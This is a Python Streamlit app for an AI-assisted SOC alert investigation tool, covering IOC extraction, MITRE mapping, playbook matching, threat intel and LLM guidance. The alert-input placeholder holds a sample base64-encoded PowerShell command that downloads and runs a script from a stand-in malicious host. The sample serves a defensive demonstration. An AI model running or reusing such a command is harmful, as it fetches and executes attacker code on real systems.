"""
AI SOC Investigation Assistant

A Streamlit-based application that helps SOC analysts investigate security alerts
using AI-powered analysis, playbook matching, IOC extraction, and threat intelligence.

Author: SOC Automation Team
Version: 1.0.0
"""

import streamlit as st
import json
import os
from datetime import datetime
from typing import Dict, Any, List, Optional

# Import custom modules
from llm_interface import OllamaLLM, get_llm
from engines.ioc_extractor import IOCExtractor
from engines.mitre_mapper import MITREMapper
from engines.playbook_engine import PlaybookEngine
from engines.threat_intel_engine import ThreatIntelEngine
from engines.detection_dictionary_engine import DetectionDictionaryEngine
from engines.investigation_source_engine import InvestigationSourceEngine
from utils.log_parser import LogParser
from utils.prompt_builder import PromptBuilder

# Page configuration
st.set_page_config(
    page_title="AI SOC Investigation Assistant",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Custom CSS for better UI
st.markdown("""
<style>
    .main-header {
        font-size: 2.5rem;
        font-weight: bold;
        color: #1E88E5;
        margin-bottom: 0.5rem;
    }
    .sub-header {
        font-size: 1.2rem;
        color: #666;
        margin-bottom: 2rem;
    }
    .status-connected {
        color: #4CAF50;
        font-weight: bold;
    }
    .status-disconnected {
        color: #F44336;
        font-weight: bold;
    }
    .section-header {
        font-size: 1.3rem;
        font-weight: bold;
        color: #333;
        margin-top: 1rem;
        margin-bottom: 0.5rem;
        border-bottom: 2px solid #1E88E5;
        padding-bottom: 0.3rem;
    }
    .ioc-badge {
        background-color: #E3F2FD;
        padding: 0.2rem 0.5rem;
        border-radius: 4px;
        margin: 0.2rem;
        display: inline-block;
    }
    .mitre-badge {
        background-color: #FFF3E0;
        padding: 0.2rem 0.5rem;
        border-radius: 4px;
        margin: 0.2rem;
        display: inline-block;
    }
    .threat-malicious {
        color: #D32F2F;
        font-weight: bold;
    }
    .threat-suspicious {
        color: #FF9800;
        font-weight: bold;
    }
    .threat-clean {
        color: #4CAF50;
    }
</style>
""", unsafe_allow_html=True)


# Initialize session state
def init_session_state():
    """Initialize Streamlit session state variables."""
    if 'llm' not in st.session_state:
        st.session_state.llm = None
    if 'analysis_results' not in st.session_state:
        st.session_state.analysis_results = None
    if 'engines_initialized' not in st.session_state:
        st.session_state.engines_initialized = False


@st.cache_resource
def initialize_engines():
    """Initialize all analysis engines (cached for performance)."""
    engines = {
        'ioc_extractor': IOCExtractor(),
        'mitre_mapper': MITREMapper(),
        'playbook_engine': PlaybookEngine(),
        'threat_intel': ThreatIntelEngine(),
        'detection_engine': DetectionDictionaryEngine(),
        'investigation_sources': InvestigationSourceEngine(),
        'log_parser': LogParser(),
        'prompt_builder': PromptBuilder()
    }
    return engines


@st.cache_resource
def initialize_vector_engine():
    """Initialize the vector engine for semantic playbook search."""
    try:
        from engines.playbook_vector_engine import PlaybookVectorEngine
        return PlaybookVectorEngine()
    except Exception as e:
        st.warning(f"Vector engine unavailable: {e}")
        return None


def get_llm_status(llm: OllamaLLM) -> Dict[str, Any]:
    """Get current LLM connection status."""
    return llm.check_connection()


def save_investigation(alert_text: str, results: Dict[str, Any]):
    """Save investigation to memory for future reference."""
    memory_path = os.path.join(
        os.path.dirname(__file__), 'data', 'investigation_memory.json'
    )
    
    try:
        with open(memory_path, 'r') as f:
            memory = json.load(f)
    except:
        memory = {'investigations': [], 'metadata': {}}
    
    investigation = {
        'id': len(memory['investigations']) + 1,
        'timestamp': datetime.now().isoformat(),
        'alert_text': alert_text[:500],  # Truncate for storage
        'alert_type': results.get('parsed_alert', {}).get('alert_type', 'unknown'),
        'ioc_count': sum(len(v) for v in results.get('iocs', {}).values()),
        'mitre_techniques': [t['technique_id'] for t in results.get('mitre_techniques', [])[:3]],
        'playbook_used': results.get('playbook', {}).get('name', 'None'),
        'threat_summary': results.get('threat_intel', {}).get('summary', {})
    }
    
    memory['investigations'].append(investigation)
    
    # Keep only last 100 investigations
    if len(memory['investigations']) > 100:
        memory['investigations'] = memory['investigations'][-100:]
    
    try:
        with open(memory_path, 'w') as f:
            json.dump(memory, f, indent=2)
    except Exception as e:
        st.warning(f"Could not save investigation: {e}")


def run_analysis(alert_text: str, engines: Dict, llm: OllamaLLM, use_vector_search: bool = False) -> Dict[str, Any]:
    """
    Run the complete analysis pipeline on an alert.
    
    Pipeline:
    1. Parse alert text
    2. Extract IOCs
    3. Map MITRE techniques
    4. Match relevant playbook
    5. Retrieve detection rule
    6. Enrich with threat intel
    7. Suggest investigation sources
    8. Generate AI guidance
    """
    results = {}
    
    # Step 1: Parse alert
    results['parsed_alert'] = engines['log_parser'].parse(alert_text)
    
    # Step 2: Extract IOCs
    results['iocs'] = engines['ioc_extractor'].extract_all(alert_text)
    
    # Step 3: Map MITRE techniques
    results['mitre_techniques'] = engines['mitre_mapper'].map_techniques(alert_text)
    
    # Step 4: Match playbook
    if use_vector_search:
        vector_engine = initialize_vector_engine()
        if vector_engine:
            results['playbook'] = vector_engine.get_best_match(alert_text)
        else:
            results['playbook'] = engines['playbook_engine'].match_playbook(alert_text)
    else:
        results['playbook'] = engines['playbook_engine'].match_playbook(alert_text)
    
    # Step 5: Match detection rule
    results['detection_rule'] = engines['detection_engine'].match_rule(alert_text)
    
    # Step 6: Threat intelligence enrichment
    results['threat_intel'] = engines['threat_intel'].enrich_iocs(results['iocs'])
    
    # Step 7: Suggest investigation sources
    results['investigation_sources'] = engines['investigation_sources'].suggest_sources(
        alert_type=results['parsed_alert'].get('alert_type'),
        iocs=results['iocs'],
        mitre_techniques=results['mitre_techniques']
    )
    
    # Step 8: Generate AI guidance
    llm_status = llm.check_connection()
    if llm_status['connected'] and llm_status['model_available']:
        prompt = engines['prompt_builder'].build_investigation_prompt(
            alert_text=alert_text,
            iocs=results['iocs'],
            mitre_techniques=results['mitre_techniques'],
            playbook=results['playbook'],
            detection_rule=results['detection_rule'],
            threat_intel=results['threat_intel'],
            investigation_sources=results['investigation_sources']
        )
        
        system_prompt = engines['prompt_builder'].get_system_prompt()
        llm_response = llm.generate(prompt, system_prompt=system_prompt)
        
        if llm_response['success']:
            results['ai_guidance'] = llm_response['response']
        else:
            results['ai_guidance'] = f"LLM Error: {llm_response['error']}"
    else:
        results['ai_guidance'] = f"LLM unavailable: {llm_status['message']}"
    
    # Save investigation to memory
    save_investigation(alert_text, results)
    
    return results


def render_sidebar(llm: OllamaLLM, engines: Dict):
    """Render the sidebar with system status and configuration."""
    st.sidebar.markdown("## 🛡️ System Status")
    
    # LLM Connection Status
    st.sidebar.markdown("### LLM Connection")
    llm_status = get_llm_status(llm)
    
    if llm_status['connected']:
        st.sidebar.markdown(
            f"<span class='status-connected'>✅ Connected</span>",
            unsafe_allow_html=True
        )
        st.sidebar.text(f"Model: {llm.model}")
        
        if llm_status['model_available']:
            st.sidebar.success("Model ready")
        else:
            st.sidebar.warning(f"Model '{llm.model}' not found")
            if llm_status['available_models']:
                st.sidebar.info(f"Available: {', '.join(llm_status['available_models'][:5])}")
    else:
        st.sidebar.markdown(
            f"<span class='status-disconnected'>❌ Disconnected</span>",
            unsafe_allow_html=True
        )
        st.sidebar.error(llm_status['message'])
        st.sidebar.info("Start Ollama: `ollama serve`")
    
    # Engine Status
    st.sidebar.markdown("### Analysis Engines")
    engine_status = {
        'IOC Extractor': '✅',
        'MITRE Mapper': '✅',
        'Playbook Engine': f"✅ ({len(engines['playbook_engine'].playbooks)} playbooks)",
        'Detection Rules': f"✅ ({len(engines['detection_engine'].rules)} rules)",
        'Threat Intel': '✅',
        'Investigation Sources': '✅'
    }
    
    for engine, status in engine_status.items():
        st.sidebar.text(f"{status} {engine}")
    
    # Vector Engine Status
    vector_engine = initialize_vector_engine()
    if vector_engine:
        st.sidebar.text("✅ Vector Search (ChromaDB)")
    else:
        st.sidebar.text("⚠️ Vector Search unavailable")
    
    st.sidebar.markdown("---")
    
    # Configuration
    st.sidebar.markdown("### Configuration")
    use_vector_search = st.sidebar.checkbox(
        "Use Semantic Search",
        value=False,
        help="Use vector embeddings for playbook matching"
    )
    
    return use_vector_search


def render_results(results: Dict[str, Any]):
    """Render analysis results in the main area."""
    
    # Create tabs for organized display
    tabs = st.tabs([
        "📋 Overview",
        "🎯 IOCs",
        "⚔️ MITRE ATT&CK",
        "📖 Playbook",
        "🔍 Detection Rule",
        "🌐 Threat Intel",
        "📊 Investigation Sources",
        "🤖 AI Guidance"
    ])
    
    # Overview Tab
    with tabs[0]:
        st.markdown("### Analysis Summary")
        
        col1, col2, col3, col4 = st.columns(4)
        
        with col1:
            ioc_count = sum(len(v) for v in results.get('iocs', {}).values())
            st.metric("IOCs Found", ioc_count)
        
        with col2:
            mitre_count = len(results.get('mitre_techniques', []))
            st.metric("MITRE Techniques", mitre_count)
        
        with col3:
            threat_summary = results.get('threat_intel', {}).get('summary', {})
            malicious = threat_summary.get('known_malicious', 0)
            st.metric("Malicious IOCs", malicious)
        
        with col4:
            playbook = results.get('playbook')
            st.metric("Playbook Match", "Yes" if playbook else "No")
        
        # Alert Type
        alert_type = results.get('parsed_alert', {}).get('alert_type', 'unknown')
        st.info(f"**Detected Alert Type:** {alert_type.replace('_', ' ').title()}")
    
    # IOCs Tab
    with tabs[1]:
        st.markdown("### Extracted Indicators of Compromise")
        
        iocs = results.get('iocs', {})
        has_iocs = any(iocs.values())
        
        if has_iocs:
            for ioc_type, values in iocs.items():
                if values:
                    with st.expander(f"**{ioc_type.replace('_', ' ').title()}** ({len(values)})", expanded=True):
                        for v in values[:20]:  # Limit display
                            st.code(v, language=None)
                        if len(values) > 20:
                            st.caption(f"... and {len(values) - 20} more")
        else:
            st.info("No IOCs extracted from this alert.")
    
    # MITRE ATT&CK Tab
    with tabs[2]:
        st.markdown("### MITRE ATT&CK Techniques")
        
        techniques = results.get('mitre_techniques', [])
        
        if techniques:
            for tech in techniques:
                with st.expander(f"**{tech['technique_id']}** - {tech['name']}", expanded=True):
                    st.markdown(f"**Tactic:** {tech['tactic']}")
                    st.markdown(f"**Description:** {tech['description']}")
                    st.markdown(f"**Match Score:** {tech['score']}")
                    if tech.get('matched_keywords'):
                        st.markdown(f"**Matched Keywords:** {', '.join(tech['matched_keywords'])}")
        else:
            st.info("No MITRE ATT&CK techniques matched.")
    
    # Playbook Tab
    with tabs[3]:
        st.markdown("### Matched SOC Playbook")
        
        playbook = results.get('playbook')
        
        if playbook:
            st.success(f"**{playbook.get('name', 'Unknown Playbook')}**")
            
            if playbook.get('description'):
                st.markdown(f"*{playbook['description']}*")
            
            col1, col2 = st.columns(2)
            
            with col1:
                st.markdown("#### Investigation Steps")
                for i, step in enumerate(playbook.get('investigation_steps', []), 1):
                    st.markdown(f"{i}. {step}")
            
            with col2:
                st.markdown("#### Containment Steps")
                for i, step in enumerate(playbook.get('containment_steps', []), 1):
                    st.markdown(f"{i}. {step}")
            
            if playbook.get('escalation_criteria'):
                st.markdown("#### Escalation Criteria")
                for criteria in playbook['escalation_criteria']:
                    st.markdown(f"- ⚠️ {criteria}")
        else:
            st.info("No matching playbook found for this alert.")
    
    # Detection Rule Tab
    with tabs[4]:
        st.markdown("### Detection Rule Context")
        
        rule = results.get('detection_rule')
        
        if rule:
            st.markdown(f"**Rule Name:** {rule.get('rule_name', 'Unknown')}")
            st.markdown(f"**Severity:** {rule.get('severity', 'N/A').upper()}")
            
            st.markdown("**Detection Logic:**")
            st.code(rule.get('logic', 'N/A'), language='sql')
            
            st.markdown(f"**Description:** {rule.get('description', 'N/A')}")
            
            if rule.get('investigation_focus'):
                st.markdown(f"**Investigation Focus:** {rule['investigation_focus']}")
            
            if rule.get('mitre_techniques'):
                st.markdown(f"**MITRE Techniques:** {', '.join(rule['mitre_techniques'])}")
        else:
            st.info("No matching detection rule found.")
    
    # Threat Intel Tab
    with tabs[5]:
        st.markdown("### Threat Intelligence Enrichment")
        
        threat_intel = results.get('threat_intel', {})
        enrichments = threat_intel.get('enrichments', {})
        summary = threat_intel.get('summary', {})
        
        # Summary metrics
        col1, col2, col3, col4 = st.columns(4)
        with col1:
            st.metric("Total Analyzed", summary.get('total_iocs', 0))
        with col2:
            st.metric("Malicious", summary.get('known_malicious', 0))
        with col3:
            st.metric("Suspicious", summary.get('known_suspicious', 0))
        with col4:
            st.metric("Unknown/Clean", summary.get('unknown', 0))
        
        if enrichments:
            st.markdown("#### Enrichment Details")
            
            for ioc_value, intel in enrichments.items():
                reputation = intel.get('reputation', 'unknown')
                
                if reputation == 'malicious':
                    icon = "🔴"
                    color_class = "threat-malicious"
                elif reputation == 'suspicious':
                    icon = "🟠"
                    color_class = "threat-suspicious"
                else:
                    icon = "🟢"
                    color_class = "threat-clean"
                
                with st.expander(f"{icon} {ioc_value} - {reputation.upper()}"):
                    st.markdown(f"**Reputation:** <span class='{color_class}'>{reputation}</span>", unsafe_allow_html=True)
                    if intel.get('threat_score') is not None:
                        st.markdown(f"**Threat Score:** {intel['threat_score']}/100")
                    st.markdown(f"**Context:** {intel.get('threat_context', 'N/A')}")
                    if intel.get('threat_types'):
                        st.markdown(f"**Threat Types:** {', '.join(intel['threat_types'])}")
        else:
            st.info("No IOCs to enrich with threat intelligence.")
    
    # Investigation Sources Tab
    with tabs[6]:
        st.markdown("### Recommended Investigation Sources")
        
        sources = results.get('investigation_sources', [])
        
        if sources:
            for source in sources:
                with st.expander(f"**{source['name']}** ({source['type']})", expanded=True):
                    st.markdown(f"*{source.get('description', '')}*")
                    
                    if source.get('queries'):
                        st.markdown("**Suggested Queries:**")
                        for query in source['queries']:
                            st.markdown(f"- {query}")
        else:
            st.info("No specific investigation sources suggested.")
    
    # AI Guidance Tab
    with tabs[7]:
        st.markdown("### AI Investigation Guidance")
        
        ai_guidance = results.get('ai_guidance', '')
        
        if ai_guidance:
            if ai_guidance.startswith("LLM") or ai_guidance.startswith("Error"):
                st.warning(ai_guidance)
            else:
                st.markdown(ai_guidance)
        else:
            st.info("AI guidance not available.")


def main():
    """Main application entry point."""
    init_session_state()
    
    # Initialize LLM
    llm = get_llm()
    
    # Initialize engines
    engines = initialize_engines()
    
    # Render sidebar and get configuration
    use_vector_search = render_sidebar(llm, engines)
    
    # Main content area
    st.markdown("<h1 class='main-header'>🛡️ AI SOC Investigation Assistant</h1>", unsafe_allow_html=True)
    st.markdown("<p class='sub-header'>Analyze security alerts with AI-powered investigation guidance</p>", unsafe_allow_html=True)
    
    # Alert input
    st.markdown("### 📝 Enter Security Alert")
    
    alert_text = st.text_area(
        "Paste your security alert here:",
        height=200,
        placeholder="""Example:
[ALERT] Suspicious PowerShell Execution Detected
Host: WORKSTATION-001
User: john.doe
Process: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAdwBhAHIAZQAuAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
Parent Process: explorer.exe
Destination IP: 45.33.32.156
Time: 2025-03-09 10:30:45 UTC
Severity: High"""
    )
    
    # Analyze button
    col1, col2, col3 = st.columns([1, 1, 3])
    
    with col1:
        analyze_button = st.button("🔍 Analyze Alert", type="primary", use_container_width=True)
    
    with col2:
        clear_button = st.button("🗑️ Clear", use_container_width=True)
    
    if clear_button:
        st.session_state.analysis_results = None
        st.rerun()
    
    # Run analysis
    if analyze_button and alert_text.strip():
        with st.spinner("🔄 Analyzing alert... This may take a moment."):
            try:
                results = run_analysis(
                    alert_text,
                    engines,
                    llm,
                    use_vector_search=use_vector_search
                )
                st.session_state.analysis_results = results
            except Exception as e:
                st.error(f"Analysis failed: {str(e)}")
                st.exception(e)
    elif analyze_button and not alert_text.strip():
        st.warning("Please enter an alert to analyze.")
    
    # Display results
    if st.session_state.analysis_results:
        st.markdown("---")
        render_results(st.session_state.analysis_results)


if __name__ == "__main__":
    main()
